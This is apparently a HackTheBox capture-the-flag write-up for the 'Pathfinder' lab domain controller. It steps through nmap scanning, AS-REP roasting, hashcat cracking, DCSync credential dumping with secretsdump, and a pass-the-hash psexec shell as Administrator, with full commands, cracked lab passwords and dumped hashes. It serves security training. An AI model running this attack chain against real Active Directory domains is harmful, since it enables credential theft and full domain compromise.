---
description: Pathfinder box from HackTheBox write up.
---

# Pathfinder

## nmap scan

As usual, let's start with a `nmap` scan:

````bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap <MACHINE_IP> -p- --min-rate 1000
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-04 07:42 EDT
Nmap scan report for <MACHINE_IP>
Host is up (0.050s latency).
Not shown: 65511 closed ports
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49683/tcp open  unknown
49698/tcp open  unknown
49717/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 103.38 seconds
           Raw packets sent: 102973 (4.531MB) | Rcvd: 84680 (3.387MB)

````

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap <MACHINE_IP> -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49683,49698,49717 -sC -sV
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-04 10:41 EDT
Nmap scan report for <MACHINE_IP>
Host is up (0.057s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-09-04 21:50:03Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49683/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
49717/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: PATHFINDER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h08m04s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-09-04T21:50:57
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.73 seconds
```

So this machine looks like a Domain Controller. I think is the first time ever i have to work with Active Directory... let's see how this goes. Also we can see that WinRM is open, can be handy in the future.

## Domain enumeration

Using the credentials we found in the Shield box: `sandra:Password1234!` we can authenticate in the domain so we can try to check the users:

```bash
┌──(kali㉿kali)-[~]
└─$ python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all -dc-ip <MACHINE_IP> MEGACORP.LOCAL/sandra
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] Querying <MACHINE_IP> for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2020-03-17 14:52:07.517633  2020-03-20 21:09:30.654209 
Guest                                                 <never>              <never>             
krbtgt                                                2020-01-25 16:53:34.376107  <never>             
svc_bes                                               2020-03-20 20:16:54.721477  2021-09-04 18:43:16.045548 
sandra                                                2020-03-20 20:17:40.846466  2021-09-04 18:29:37.061223
```

Also, with BloodHound (Remember to open `neo4j` database first!) we can check a lot of information about the domain, we can use the `bloodhound-python` as ingestor:

```bash
bloodhound-python -u sandra -p Password1234! -ns <MACHINE_IP> -d megacorp.local -c all
```

Once we upload the information to BloodHound we can check for attack vectors. The `Find Principals with DCSync Rights` query returned something insteresting:

 <p align="center"><img alt="Screenshot with the BloodHound query result" src="/assets/images/write-ups/htb/Pathfinder-DCSyncRights.png"></p>

`SVC_BES` user has `GetChanges` and `GetChangesAll` privileges so we can perform a `dsync` attack from that user to get a list of the domain users secrets. Let's check if that user has Kerberos pre-authentication enabled:

```bash
┌──(kali㉿kali)-[~]
└─$ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip <MACHINE_IP> -no-pass  megacorp.local/svc_bes
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for svc_bes
$krb5asrep$23$svc_bes@MEGACORP.LOCAL:e38bdf345d80e70f11bc176b32d549a2$e710e585dabe65b552cc143b9426423877ec00c38b1531d904591c9905dbba0ed28d516cb5aca86864769a9e47d0af41a7b4557949b235dccadbc2ca18346010a08fed48fa67bf0582a74592c415d29b3f2066919206c3cd4e329629883c82f428e5ce37f5408f6708b943eeca1d95dd7b469e2ca09ba874639d226d51a4581ef396e41fd15e6ca6f33420cfbcb53457a8ec4a8c5f96e70d6f38f7b66347380c834f9ce3a05ea8c8d36c708a4ffe3908f9af5d5b9734854a15c704c4a13313584ab009d6c5a036f4858c960ee34952b9281787147b4a53ea14b3c06a0a455c9ad7fada2c9f06aa7b7e114132b8313f4c
```

## ASREPRoasting

We got a TGT so we can go for a ASREPRoasting using `hashcat` (I tried `john` but looks like it is broken in my system or whatever):

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Pathfinder]
└─$ hashcat -m 18200 -a 0 hash.txt ~/Tools/Wordlists/rockyou.txt 
hashcat (v6.1.1) starting...
[...]
$krb5asrep$23$svc_bes@MEGACORP.LOCAL:e38bdf345d80e70f11bc176b32d549a2$e710e585dabe65b552cc143b9426423877ec00c38b1531d904591c9905dbba0ed28d516cb5aca86864769a9e47d0af41a7b4557949b235dccadbc2ca18346010a08fed48fa67bf0582a74592c415d29b3f2066919206c3cd4e329629883c82f428e5ce37f5408f6708b943eeca1d95dd7b469e2ca09ba874639d226d51a4581ef396e41fd15e6ca6f33420cfbcb53457a8ec4a8c5f96e70d6f38f7b66347380c834f9ce3a05ea8c8d36c708a4ffe3908f9af5d5b9734854a15c704c4a13313584ab009d6c5a036f4858c960ee34952b9281787147b4a53ea14b3c06a0a455c9ad7fada2c9f06aa7b7e114132b8313f4c:Sheffield19
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, AS-REP
Hash.Target......: $krb5asrep$23$svc_bes@MEGACORP.LOCAL:e38bdf345d80e7...313f4c
Time.Started.....: Sat Sep  4 13:43:33 2021 (18 secs)
Time.Estimated...: Sat Sep  4 13:43:51 2021 (0 secs)
Guess.Base.......: File (/home/kali/Tools/Wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   599.9 kH/s (11.13ms) @ Accel:64 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10616832/14344359 (74.01%)
Rejected.........: 0/10616832 (0.00%)
Restore.Point....: 10600448/14344359 (73.90%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: Sidney07 -> Sabine13

Started: Sat Sep  4 13:42:18 2021
Stopped: Sat Sep  4 13:43:51 2021
```

So we got new credentials! `svc_bes:Sheffield19`.

### Using WinRM as svc_bes 

Remember the `winrm` service? We can use it to get the user flag!

```bash
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i <MACHINE_IP> -u svc_bes -p Sheffield19

Evil-WinRM shell v3.2

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_bes\Documents>
```

The user flag is under `C:\Users\svc_bes\Desktop\user.txt`.

## DCSync attack

Now we have access to the user `svc_bes` and we can go for the DCSync attack. We can use `secretsdump.py`from `impacket`:

```bash
┌──(kali㉿kali)-[~]
└─$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -dc-ip <MACHINE_IP> megacorp.local/svc_bes:Sheffield19@<MACHINE_IP>
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f9f700dbf7b492969aac5943dab22ff3:::
svc_bes:1104:aad3b435b51404eeaad3b435b51404ee:0d1ce37b8c9e5cf4dbd20f5b88d5baca:::
sandra:1105:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
PATHFINDER$:1000:aad3b435b51404eeaad3b435b51404ee:72d67f7817427a6c2fe2877249511a6c:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:056bbaf3be0f9a291fe9d18d1e3fa9e6e4aff65ef2785c3fdc4f6472534d614f
Administrator:aes128-cts-hmac-sha1-96:5235da455da08703cc108293d2b3fa1b
Administrator:des-cbc-md5:f1c89e75a42cd0fb
krbtgt:aes256-cts-hmac-sha1-96:d6560366b08e11fa4a342ccd3fea07e69d852f927537430945d9a0ef78f7dd5d
krbtgt:aes128-cts-hmac-sha1-96:02abd84373491e3d4655e7210beb65ce
krbtgt:des-cbc-md5:d0f8d0c86ee9d997
svc_bes:aes256-cts-hmac-sha1-96:2712a119403ab640d89f5d0ee6ecafb449c21bc290ad7d46a0756d1009849238
svc_bes:aes128-cts-hmac-sha1-96:7d671ab13aa8f3dbd9f4d8e652928ca0
svc_bes:des-cbc-md5:1cc16e37ef8940b5
sandra:aes256-cts-hmac-sha1-96:2ddacc98eedadf24c2839fa3bac97432072cfac0fc432cfba9980408c929d810
sandra:aes128-cts-hmac-sha1-96:c399018a1369958d0f5b242e5eb72e44
sandra:des-cbc-md5:23988f7a9d679d37
PATHFINDER$:aes256-cts-hmac-sha1-96:b918cf6ef0d04dc72cdfb040d9ffac663c28d2c358cbf35ab3466aa454cadfdc
PATHFINDER$:aes128-cts-hmac-sha1-96:44f15fe35fb206e80d660933a7c31af9
PATHFINDER$:des-cbc-md5:9b9e1089195273e0
[*] Cleaning up...
```

With that we have the domain administrator secret so we can impersonate him! Let's try to get a shell into the system now.

### Accessing the system as root

Now we can go for a Pass-the-Hash attack using `psexec.py` (Again from `impacket`):

```bash
┌──(kali㉿kali)-[~]
└─$ python3 /usr/share/doc/python3-impacket/examples/psexec.py -dc-ip <MACHINE_IP> megacorp.local/Administrator@<MACHINE_IP> -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on <MACHINE_IP>.....
[*] Found writable share ADMIN$
[*] Uploading file DVmUjbDh.exe
[*] Opening SVCManager on <MACHINE_IP>.....
[*] Creating service LUsD on <MACHINE_IP>.....
[*] Starting service LUsD.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

The root flag is under `C:\Users\Administrator\Desktop\root.txt`.

